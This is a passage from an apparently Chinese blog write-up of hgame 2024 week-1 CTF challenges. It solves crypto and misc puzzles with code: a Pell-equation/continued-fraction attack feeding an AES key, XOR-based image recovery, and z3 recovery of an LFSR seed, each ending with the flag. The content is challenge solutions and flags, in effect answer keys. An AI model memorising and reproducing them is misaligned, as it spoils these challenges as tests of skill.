class="line">flag=pad(flag)</span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line">enc=encrypt(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br></pre></td></tr></table></figure>

<p>先用java求出 <code>x</code> 和 <code>y</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">    &#123;</span><br><span class="line">        BigInteger N, p1, p2, q1, q2, a0, a1, a2, g1, g2, h1, h2,p,q;</span><br><span class="line">        g1 = q2 = p1 = BigInteger.ZERO;</span><br><span class="line">        h1 = q1 = p2 = BigInteger.ONE;</span><br><span class="line">        a0 = a1 = BigInteger.valueOf((<span class="type">int</span>)Math.sqrt(<span class="number">1.0</span>*n));</span><br><span class="line">        BigInteger ans=a0.multiply(a0);</span><br><span class="line">        <span class="keyword">if</span>(ans.equals(BigInteger.valueOf(n)))</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;No solution!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        N = BigInteger.valueOf(n);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            g2 = a1.multiply(h1).subtract(g1);</span><br><span class="line">            h2 = N.subtract(g2.pow(<span class="number">2</span>)).divide(h1);</span><br><span class="line">            a2 = g2.add(a0).divide(h2);</span><br><span class="line">            p = a1.multiply(p2).add(p1);</span><br><span class="line">            q = a1.multiply(q2).add(q1);</span><br><span class="line">            <span class="keyword">if</span> (p.pow(<span class="number">2</span>).subtract(N.multiply(q.pow(<span class="number">2</span>))).compareTo(BigInteger.ONE) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            g1 = g2;h1 = h2;a1 = a2;</span><br><span class="line">            p1 = p2;p2 = p;</span><br><span class="line">            q1 = q2;q2 = q;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;x = &quot;</span>+p+<span class="string">&quot;\ny = &quot;</span>+q);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cin</span> <span class="operator">=</span> <span class="number">114514</span>;</span><br><span class="line">        solve(cin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">x = 3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199</span></span><br><span class="line"><span class="comment">y = 9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>接着带入python中解aes</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">x = <span class="number">3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199</span></span><br><span class="line">y = <span class="number">9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></span><br><span class="line"></span><br><span class="line">enc=<span class="string">b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    decrypted =cipher.decrypt(enc)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">flag=decrypt(key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="奇怪的图片"><a href="#奇怪的图片" class="headerlink" title="奇怪的图片"></a>奇怪的图片</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;hgame&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_image</span>(<span class="params">width, height</span>):</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    pixels = image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            red = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            green = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            blue = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            pixels[x, y] = (red, green, blue)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_text</span>(<span class="params">image, width, height, token</span>):</span><br><span class="line">    font_size = random.randint(<span class="number">16</span>, <span class="number">40</span>)</span><br><span class="line">    font = ImageFont.truetype(<span class="string">&quot;arial.ttf&quot;</span>, font_size)</span><br><span class="line">    text_color = (random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    x = random.randint(<span class="number">0</span>, width - font_size * <span class="built_in">len</span>(token))</span><br><span class="line">    y = random.randint(<span class="number">0</span>, height - font_size)</span><br><span class="line">    draw = ImageDraw.Draw(image)</span><br><span class="line">    draw.text((x, y), token, font=font, fill=text_color)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_unique_strings</span>(<span class="params">n, length</span>):</span><br><span class="line">    unique_strings = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(unique_strings) &lt; n:</span><br><span class="line">        random_string = secrets.token_hex(length // <span class="number">2</span>)</span><br><span class="line">        unique_strings.add(random_string)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(unique_strings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">random_strings = generate_unique_strings(<span class="built_in">len</span>(flag), <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line">key_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_time</span>(<span class="params">image, name</span>):</span><br><span class="line">    time.sleep(random.random())</span><br><span class="line">    image.save(<span class="string">&quot;.\\png_out\\&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    current_image = draw_text(current_image, <span class="number">120</span>, <span class="number">80</span>, flag[i])</span><br><span class="line">    threading.Thread(target=random_time, args=(xor_images(current_image, key_image), random_strings[i])).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以知道flag是不断追加在画布<code>current_image</code>上的，每次追加完都会和<code>key_image</code>异或后输出一张图片。</p>
<p>只要确定 <code>i-1</code> 和 <code>i</code>，它们相互异或，就能得到 <code>flag[i]</code> 字符</p>
<p>先把所有情况都异或出来，然后单独放一个文件夹。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">base_dir = <span class="string">&#x27;./png_out&#x27;</span></span><br><span class="line"></span><br><span class="line">files = [file <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(base_dir)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">    os.makedirs(<span class="string">f&#x27;./img/<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;files[i].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">        img = xor_images(Image.<span class="built_in">open</span>(<span class="string">f&quot;./png_out/<span class="subst">&#123;files[i]&#125;</span>&quot;</span>),Image.<span class="built_in">open</span>(<span class="string">f&quot;./png_out/<span class="subst">&#123;files[j]&#125;</span>&quot;</span>))</span><br><span class="line">        img.save(<span class="string">f&#x27;./img/<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;files[i].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]&#125;</span>/<span class="subst">&#123;files[j]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看所有文件夹，按照大小升序排序，可以在<code>9_5c55dc77</code>文件夹下看到这个情况。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/c_3_1.png"></p>
<p>由此可以确定<code>5c55dc77.png</code>对应着 <code>flag[0]</code> 的<code>h</code>，再对这个文件夹单独处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_dir = <span class="string">&#x27;./9_5c55dc77&#x27;</span></span><br><span class="line"></span><br><span class="line">files = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(base_dir):</span><br><span class="line">    imgSize = os.stat(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+file).st_size</span><br><span class="line">    files[file]=imgSize</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据大小排序</span></span><br><span class="line">sort_files = <span class="built_in">sorted</span>(files.items(),key = <span class="keyword">lambda</span> d:d[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(sort_files)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sort_files)-<span class="number">1</span>):</span><br><span class="line">    img1 = sort_files[i][<span class="number">0</span>]</span><br><span class="line">    img2 = sort_files[i+<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    img = xor_images(Image.<span class="built_in">open</span>(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+img1),Image.<span class="built_in">open</span>(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+img2))</span><br><span class="line">    img.save(<span class="string">f&#x27;./new_img/<span class="subst">&#123;<span class="built_in">str</span>(i)&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>可以在<code>new_img</code>文件夹下看到flag。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/c_3_2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;1adf_17eb_803c&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ezPRNG"><a href="#ezPRNG" class="headerlink" title="ezPRNG"></a>ezPRNG</h2><p>用z3求解即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">output=[<span class="string">&#x27;1111110110111011110000101011010001000111111001111110100101000011110111111100010000111110110111100001001000101101011110111100010010100000011111101101110101011010111000000011110000100011101111011011000100101100110100101110001010001101101110000010001000111100101010010110110111101110011011001011111011010101011000011011000111011011111001101010111100101100110001011010010101110011101001100111000011110111000001101110000001111100000100000101111100010110111001110011010000011011110110011000001101011111111010110011010111010101001000010011110110011110110101011110111010011010010110111111010011101000110101111101111000110011111110010110000100100100101101010101110010101001101010101011110111010011101110000100101111010110101111110001111111110010000000001110011100100001011111110100111011000101001101001110010010001100011000001101000111010010000101101111101011000000101000001110001011001010010001000011000000100010010010010111010011111111011100100100100101111111001110000111110110001111001111100101001001100010&#x27;</span>, <span class="string">&#x27;0010000000001010111100001100011101111101111000100100111010101110010110011001011110101100011101010000001100000110000000011000000110101111111011100100110111011010000100011111000111001000101001110010110010001000110010101011110011101000011111101101011000011110001101011111000110111000011000110011100100101100111100000100100101111001011101110001011011111111011010100010111011000010010101110110100000110100000100010101000010111101001000011000000000111010010101010111101101011111011001000101000100011001100101010110110001010010001010110111011011111101011100111001101111111111010011101111010010011110011111110100110011111110110001000111100010111000101111000011011011111101110101110100111000011100001010110111100011001011010011010111000110101100110100011101101011101000111011000100110110001100110101010110010011011110000111110100111101110000100010000111100010111000010000010001111110110100001000110110100100110110010110111010011111101011110000011101010100110101011110000110101110111011010110110000010000110001&#x27;</span>, <span class="string">&#x27;1110110110010001011100111110111110111001111101010011001111100100001000111001101011010100010111110101110101111010111100101100010011001001011101000101011000110111000010000101001000100111010110001010000111110110111000011001100010001101000010001111111100000101111000100101000000001001001001101110000100111001110001001011010111111010111101101101001110111010111110110011001000010001010100010010110110101011100000101111100100110011110001001001111100101111001111011011010111001001111010001100110001100001100000110000011111010100101111000000101011111010000111110000101111100010000010010111010110100101010101001111100101011100011001001011000101010101001101100010110000010001110011110011100111000110101010111010011010000001100001011000011101101000000011111000101111101011110011000011011000100100110111010011001111101100101100011000101001110101111001000010110010111101110110010101101000000101001011000000001110001110000100000001001111100011010011000000011011101111101001111110001011101100000010001001010011000001&#x27;</span>, <span class="string">&#x27;0001101010101010100001001001100010000101010100001010001000100011101100110001001100001001110000110100010101111010110111001101011011101110000011001000100100101000011011101000111001001010011100010001010110111011100100111110111001010010111010100000100111110101110010010110100001000010010001101111001110100010001011101100111011101011101100100101011010101000101001000101110011011111110110011111111100000000011100000010011000110001000110101010001011000010101000110000101001110101010111011010010111011001010011100010101001100110000110101100010000100110101110100001101001011011110011100110011001010110100101010111110110111100000111010001111101110000000000111011011101000011001010010111001110111000100111011110100101000100011011101100011111000101110110110111111001111000000011100011000010000101001011001101110101000010101001000100110010000101001111100101000001011011010011110001101000001101111010100101001100010100000111000011110101010100011011001110001011110111010111011010101101100000110000001010010101111011&#x27;</span>]</span><br><span class="line"></span><br><span class="line">mask=<span class="number">0b10001001000010000100010010001001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRNG</span>(<span class="params">R,mask</span>):</span><br><span class="line">    nextR = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    nextbit=<span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        nextbit ^= (i%<span class="number">2</span>)</span><br><span class="line">        i = i&gt;&gt;<span class="number">1</span></span><br><span class="line">    nextR^=nextbit </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (nextR,nextbit)</span><br><span class="line">    </span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    R = BitVec(<span class="string">&#x27;R&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    s = Solver()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        (R,nextbit)=PRNG(R,mask)</span><br><span class="line">        s.add(nextbit==output[k][i])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        res = s.model()</span><br><span class="line">        m = <span class="built_in">str</span>(res)[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">        flag+=<span class="built_in">hex</span>(<span class="built_in">int</span>(m))[<span class="number">2</span>:]</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">hgame = <span class="string">&#x27;hgame&#123;&#x27;</span>+flag[:<span class="number">8</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">8</span>:<span class="number">12</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">12</span>:<span class="number">16</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">16</span>:<span class="number">20</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">20</span>:]+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(hgame)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fbbbee823f434f919337907880e4191a</span></span><br><span class="line"><span class="comment"># hgame&#123;fbbbee82-3f43-4f91-9337-907880e4191a&#125;</span></span><br></pre></td></tr></table></figure>

</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/write-up/">write up</a><a class="post-meta__tags" href="/tags/WEB/">WEB</a><a class="post-meta__tags" href="/tags/MISC/">MISC</a><a class="post-meta__tags" href="/tags/CRYPTO/">CRYPTO</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/REVERSE/">REVERSE</a><a class="post-meta__tags" href="/tags/hgame/">hgame</a></div><div class="post_share"><div class="social-share" data-image="/./hgame2024_week1/%E5%B0%81%E9%9D%A2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/BeginCTF/" title="BeginCTF WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./BeginCTF/%E5%B0%81%E9%9D%A2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BeginCTF WP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/BeginCTF/" title="BeginCTF WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./BeginCTF/%E5%B0%81%E9%9D%A2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-06</div><div class="title">BeginCTF WP</div></div></a></div><div><a href="/DASCTF/" title="DASCTF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://files.buuoj.cn/files/af4ab817bcd19b8b3618173239af6c0c/11111.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-25</div><div class="title">DASCTF</div></div></a></div><div><a href="/NSSCTF_2nd_WP/" title="NSSCTF_2nd_WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://www.ctfer.vip/files/2023/8/8/2d5f7c69e5.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-28</div><div class="title">NSSCTF_2nd_WP</div></div></a></div><div><a href="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/" title="ctfshow红包挑战7_WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/banner.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-13</div><div class="title">ctfshow红包挑战7_WP</div></div></a></div><div><a href="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/" title="ctfshow红包挑战8_WP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/banner.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-13</div><div class="title">ctfshow红包挑战8_WP</div></div></a></div><div><a href="/%E2%80%BBCTF/" title="※CTF"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%E2%80%BBCTF/cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-29</div><div class="title">※CTF</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/chenxi.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晨曦</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">目前还没有公告哦<br>如果遇到问题请在评论区指出哦<br></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2048-16"><span class="toc-number">1.1.</span> <span class="toc-text">2048*16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-it"><span class="toc-number">1.2.</span> <span class="toc-text">Bypass it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jhat"><span class="toc-number">1.3.</span> <span class="toc-text">jhat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezHTTP"><span class="toc-number">1.4.</span> <span class="toc-text">ezHTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Select-Courses"><span class="toc-number">1.5.</span> <span class="toc-text">Select 